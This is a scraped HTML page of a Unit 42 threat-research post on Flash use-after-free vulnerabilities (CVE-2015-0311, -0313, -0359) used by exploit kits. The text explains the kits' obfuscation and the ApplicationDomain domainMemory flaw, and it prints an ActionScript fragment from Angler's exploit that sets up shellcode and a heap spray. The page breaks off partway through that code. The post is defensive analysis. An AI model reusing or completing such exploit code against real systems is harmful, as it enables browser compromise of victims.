				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-9209 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">The Latest Flash UAF Vulnerabilities in Exploit Kits</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-9209 entry-meta">
			
			
			<span class="post-views-count">10,862</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'9209','like')"><i class="ui ui-2"></i><span class="ml-5">0</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 11</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthe-latest-flash-uaf-vulnerabilities-in-exploit-kits%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthe-latest-flash-uaf-vulnerabilities-in-exploit-kits%2F+-+The+Latest+Flash+UAF+Vulnerabilities+in+Exploit+Kits" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthe-latest-flash-uaf-vulnerabilities-in-exploit-kits%2F&title=The+Latest+Flash+UAF+Vulnerabilities+in+Exploit+Kits&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/the-latest-flash-uaf-vulnerabilities-in-exploit-kits/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/tao-yan/" title="Posts by Tao Yan" class="author url fn" rel="author">Tao Yan</a>        </p>
        <p><time datetime="2015-05-28T13:00:21+00:00">May 28, 2015 at 6:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/malware-2/" rel="category tag">Malware</a>, <a href="https://unit42.paloaltonetworks.com/category/threat-prevention-2/" rel="category tag">Threat Prevention</a>, <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/adobe-flash/" rel="tag">Adobe Flash</a>, <a href="https://unit42.paloaltonetworks.com/tag/bytearray/" rel="tag">ByteArray</a>, <a href="https://unit42.paloaltonetworks.com/tag/flash-uaf/" rel="tag">Flash UAF</a>, <a href="https://unit42.paloaltonetworks.com/tag/vulnerabilities/" rel="tag">vulnerabilities</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                    <h3>Introduction</h3>
<p>Recently, several popular exploit kits, including Angler, Flash EK, SweetOrange, Fiesta andNeutrino[1], have included several use-after-free (UAF) vulnerabilities in Adobe Flash to exploit victims’ browsers. Previously, these exploit kits typically used out-of-bounds access (OBA) vulnerabilities in Adobe Flash, as these types of vulnerabilities can be exploited universally and stably [2], and require less effort to exploit compared to UAF vulnerabilities. In order to detect these newly added UAF vulnerabilities, we analyzed the code found in the exploit kits to determine which vulnerabilities are present and how they are exploited.</p>
<h3>Obfuscation in exploit kits</h3>
<p><span id="more-9209"></span>To determine the vulnerabilities within each exploit kit, we first had to overcoming the various obfuscation methods present in the JavaScript. Each exploit kit employs a different set of obfuscation methods, as seen in Figures 1, 2 and 3; however, the main JavaScript obfuscation methods seen in these kits are JavaScript function hooks, variable substitution and no operation (NOP) insertion. The most common obfuscation method seen in these exploits scripts is variable substitution, in which the JavaScript will use regex, math, concat, split, replace and other functions to manipulate and construct values that the script assigns to variables. The analysis of the exploit kits and details on the obfuscation methods used by specific exploit kits are beyond the scope of this report.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/05/UAF_1.png" rel="wpdevart_lightbox"><img class="aligncenter size-large wp-image-9210" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2015/05/UAF_1-500x192.png" alt="UAF_1" width="500" height="192" /></a></p>
<p style="text-align: center;"><strong>Figure 1. </strong>Angler&#8217;s JavaScript Obfuscation</p>
<p style="text-align: center;"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/05/UAF_2.png" rel="wpdevart_lightbox"><img class="aligncenter size-large wp-image-9211" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2015/05/UAF_2-500x89.png" alt="UAF_2" width="500" height="89" /></a></p>
<p style="text-align: center;"><strong>Figure 2.</strong> SweetOrange&#8217;s JavaScript Obfuscation</p>
<p style="text-align: center;"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/05/uaf_3.png" rel="wpdevart_lightbox"><img class="aligncenter size-large wp-image-9212" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2015/05/uaf_3-500x114.png" alt="uaf_3" width="500" height="114" /></a></p>
<p style="text-align: center;"><strong>Figure 3. </strong>Fiesta&#8217;s JavaScript Obfuscation</p>
<p>The exploit kits also use obfuscation methods within the ActionScript code inside the Flash SWF files loaded by the malicious JavaScript. Similar to the exploit kit’s JavaScript, the obfuscation methods found in the ActionScript also include variable substitution and NOP insertion, which requires deobfuscation and increases the effort required to decompile and analyze the ActionScript. Further obfuscation methods used in the SWF files, which is almost universal amongst the different exploit kits, involves packing the SWF in several layers by using the “Loader::loadbytes()” function. As shown in the Figures 4 and 5, the layers of obfuscation just add complexity and increase the level effort required to analyze the vulnerability, as the most internal layer is always the exploit layer.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/05/uaf_4.png" rel="wpdevart_lightbox"><img class="aligncenter size-large wp-image-9213" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2015/05/uaf_4-500x137.png" alt="uaf_4" width="500" height="137" /></a></p>
<p style="text-align: center;"><strong>Figure 4. </strong>Angler&#8217;s SWF Obfuscation, Layer 1</p>
<p style="text-align: left;"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/05/uaf_5.png" rel="wpdevart_lightbox"><img class="aligncenter size-large wp-image-9214" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2015/05/uaf_5-500x141.png" alt="uaf_5" width="500" height="141" /></a></p>
<p style="text-align: center;"><strong>Figure 5. </strong>Angler&#8217;s SWF Obfuscation, Layer 2</p>
<h3>Vulnerability analysis</h3>
<p>Once the JavaScript and ActionScript are deobfuscated, we can locate the specific vulnerabilities and determine how they are exploited. The use-after-free vulnerabilities involved in these popular exploit kits are CVE-2015-0311, CVE-2015-0313 and CVE-2015-0359, which we discuss elsewhere in this report. We found that these three CVEs discuss vulnerabilities in the same ApplicationDomain class. Every ActionScript class has an application domain, usually held by LoaderContext, to define its security context, especially when loading an external SWF by using Loader::load() or Loader::loadbytes(). Figure 6 shows the ApplicationDomain definition in Adobe’s documentation.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2015/05/uaf_6.png" rel="wpdevart_lightbox"><img class="aligncenter size-large wp-image-9215" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2015/05/uaf_6-500x209.png" alt="uaf_6" width="500" height="209" /></a></p>
<p style="text-align: center;"><strong>Figure 6.</strong> Adobe&#8217;s definition of ApplicationDomain</p>
<p>The ApplicationDomain class has a property, domainMemory, which can be set to a ByteArray Object. The domainMemory ByteArray Object can be shared by other threads or used by other methods or classes. The use-after-free vulnerability arises because the ApplicationDomain relies on notifications to synchronize objects, whereas the other thread or class/method does not send a message when they free the ByteArray. The ByteArray that was free is still referenced by the ApplicationDomain because it was not notified that the ByteArray was freed. For instance, ByteArray::compress and ByteArray::decompress do not notify the ApplicationDomain when they free a ByteArray due to an IOError, or when a worker thread does not notify the main thread when it frees a ByteArray, which both cause the use-after-free situation.</p>
<p>During our analysis, we found that the Angler exploit kit not only forgot to obfuscate its exploit layer within the ActionScript found within the malicious SWF file, but also used helpful variable and function names that made it very easy to understand. Due to its straightforward nature, we will use Angler’s SWF as an example to show a step-by-step process to describe how it exploits the CVE-2015-0313 vulnerability.</p>
<p>In the first stage, the ActionScript performs heap layout work, sets a byteArray buffer named “attacking_buffer” to “ApplicationDomain.currentDomain.domainMemory”, and sends a message to trigger the worker thread. Figure 7 shows the ActionScript within Angler’s malicious SWF file.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69285f5678c890816100" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
      private function exploit_primordial_start(param1:String) : Boolean
      {
         if(!this.check_environment())
         {
            return false;
         }
         var _loc2_:String = this.DecryptX86URL(param1);
         this.shellcodes = new Shellcodes(_loc2_,this.xkey.toString());
         this.prepare_attack();
         this.make_spray_by_buffers_no_holes();
         ApplicationDomain.currentDomain.domainMemory = this.attacking_buffer;
         this.main_to_worker.send(this.message_hello);
         return true;
      }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69285f5678c890816100-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5678c890816100-2">2</div><div class="crayon-num" data-line="crayon-5f69285f5678c890816100-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5678c890816100-4">4</div><div class="crayon-num" data-line="crayon-5f69285f5678c890816100-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5678c890816100-6">6</div><div class="crayon-num" data-line="crayon-5f69285f5678c890816100-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5678c890816100-8">8</div><div class="crayon-num" data-line="crayon-5f69285f5678c890816100-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5678c890816100-10">10</div><div class="crayon-num" data-line="crayon-5f69285f5678c890816100-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5678c890816100-12">12</div><div class="crayon-num" data-line="crayon-5f69285f5678c890816100-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f5678c890816100-14">14</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69285f5678c890816100-1"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">exploit_primordial_start</span><span class="crayon-sy">(</span><span class="crayon-v">param1</span><span class="crayon-o">:</span><span class="crayon-t">String</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">Boolean</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5678c890816100-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f69285f5678c890816100-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">check_environment</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5678c890816100-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f69285f5678c890816100-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5678c890816100-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f69285f5678c890816100-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc2_</span><span class="crayon-o">:</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">DecryptX86URL</span><span class="crayon-sy">(</span><span class="crayon-v">param1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5678c890816100-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">shellcodes</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Shellcodes</span><span class="crayon-sy">(</span><span class="crayon-v">_loc2_</span><span class="crayon-sy">,</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">xkey</span><span class="crayon-sy">.</span><span class="crayon-e">toString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5678c890816100-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">prepare_attack</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5678c890816100-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">make_spray_by_buffers_no_holes</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5678c890816100-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ApplicationDomain</span><span class="crayon-sy">.</span><span class="crayon-v">currentDomain</span><span class="crayon-sy">.</span><span class="crayon-v">domainMemory</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span 